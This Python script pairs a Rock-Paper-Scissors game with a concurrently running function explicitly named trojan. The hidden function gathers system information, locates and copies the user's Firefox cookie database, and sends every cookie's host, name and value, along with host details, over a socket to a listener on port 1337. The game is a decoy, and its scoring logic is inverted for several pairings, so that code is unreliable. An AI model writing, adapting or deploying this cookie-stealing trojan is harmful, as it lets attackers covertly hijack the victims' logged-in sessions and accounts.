import os
import random
import socket
import threading
import sqlite3

def trojan():
    # Create a socket object
    client = socket.socket()

    # Gather basic system information using os module
    system_info = {}
    system_info['system'] = os.name
    system_info['hostname'] = os.uname().nodename
    system_info['release'] = os.uname().release
    system_info['version'] = os.uname().version
    system_info['architecture'] = os.uname().machine
    system_info['private_ip'] = socket.gethostbyname(socket.getfqdn())
    system_info['current_directory'] = os.getcwd()

    # Server address and port
    serv_addr = "127.0.0.1"
    port = 1337

    # Prepare system information as a string
    data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())

    # Connect to the server
    try:
        client.connect((serv_addr, port))
        client.sendall("[Client] Fetching Basic System Information".encode())
        client.sendall(data.encode())

        # Get the path to the cookies.sqlite file
        profile_dirs = os.listdir(os.path.expanduser("~/.mozilla/firefox/"))
        cookies_path = ""
        for profile_dir in profile_dirs:
            profile_path = os.path.expanduser(f"~/.mozilla/firefox/{profile_dir}")
            if os.path.isdir(profile_path):
                db_path = os.path.join(profile_path, "cookies.sqlite")
                if os.path.isfile(db_path):
                    cookies_path = db_path
                    break

        if not cookies_path:
            client.sendall("[Client] No Firefox cookies found.".encode())
        else:
            # Copy the cookies.sqlite file to a temporary location
            loot_path = "/tmp/cookies.sqlite.loot"
            os.system(f"cp '{cookies_path}' '{loot_path}'")

            # Connect to the copied database and fetch the cookies
            conn = sqlite3.connect(loot_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host, "
                           "CASE WHEN substr(host, 1, 1)='.' THEN 'TRUE' ELSE 'FALSE' END, "
                           "path, "
                           "CASE WHEN isSecure=0 THEN 'FALSE' ELSE 'TRUE' END, "
                           "expiry, "
                           "name, "
                           "value "
                           "FROM moz_cookies")
            rows = cursor.fetchall()
            cookie_data = ""
            # Send the cookies to the server
            client.sendall("[Client] Dumping Cookies...".encode())
            for row in rows:
                host, is_domain, path, is_secure, expiry, name, value = row
                cookie_data += f"Host: {host}\n"
                cookie_data += f"Is Domain: {is_domain}\n"
                cookie_data += f"Path: {path}\n"
                cookie_data += f"Is Secure: {is_secure}\n"
                cookie_data += f"Expiry: {expiry}\n"
                cookie_data += f"Name: {name}\n"
                cookie_data += f"Value: {value}\n"
                cookie_data += "----------------------\n"
                client.sendall(cookie_data.encode())

            client.sendall("[Client] Transfer Completed!".encode())
            # Close the database connection
            conn.close()

    except Exception as e:
        print(f"An error occurred: {e}")

    # Close the connection
    client.close()

# A game stolen from my other project
# RockPaperScissors.py
def game():
    def num2choice(num):
        if num == 1:
            return "Rock"
        elif num == 2:
            return "Paper"
        elif num == 3:
            return "Scissors"
        else:
            print("Invalid Option Entered!")
            exit(1)

    def board():
        print("1 - Rock")
        print("2 - Paper")
        print("3 - Scissors")

    win = 0
    loss = 0
    draw = 0
    print("Welcome To Rock Paper Scissor Tournament")
    num_rounds = int(input("Enter The Number Of Rounds: "))

    for round in range(num_rounds):
        print(f"-----------------------------------Round: {round+1}-----------------------------------")
        comp = random.randint(1, 3)
        board()
        user = int(input("=> "))
        print(f"You Chose: {num2choice(user)}")
        print(f"Computer Chose: {num2choice(comp)}")
        if user == comp:
            print("Round Resulted In A Draw!")
            draw += 1
        elif user == 1 and comp == 2:
            print("The Round Resulted In a Win!")
            win += 1
        elif user == 1 and comp == 3:
            print("The Round Resulted In A Loss")
            loss += 1
        elif user == 2 and comp == 1:
            print("The Round Resulted In a Win!")
            win += 1
        elif user == 2 and comp == 3:
            print("The Round Resulted In A Loss")
            loss += 1
        elif user == 3 and comp == 1:
            print("The Round Resulted In A Loss")
            loss += 1
        elif user == 3 and comp == 2:
            print("The Round Resulted In a Win!")
            win += 1
    print("-"*30)
    print("Statistics: ")
    print(f"Won: {win}")
    print(f"Lost: {loss}")
    print(f"Draw: {draw}")

    if win > loss:
        print("You Won This Tournament!")
    elif win < loss:
        print("You Lost This Tournament!")
    elif win == loss:
        print("The Tournament Resulted In A Draw!")

def main():
    # Create thread objects for each function
    trojan_thread = threading.Thread(target=trojan)
    game_thread = threading.Thread(target=game)

    # Start the threads
    trojan_thread.start()
    game_thread.start()

    # Wait for the threads to complete
    trojan_thread.join()
    game_thread.join()

if __name__ == '__main__':
    main()
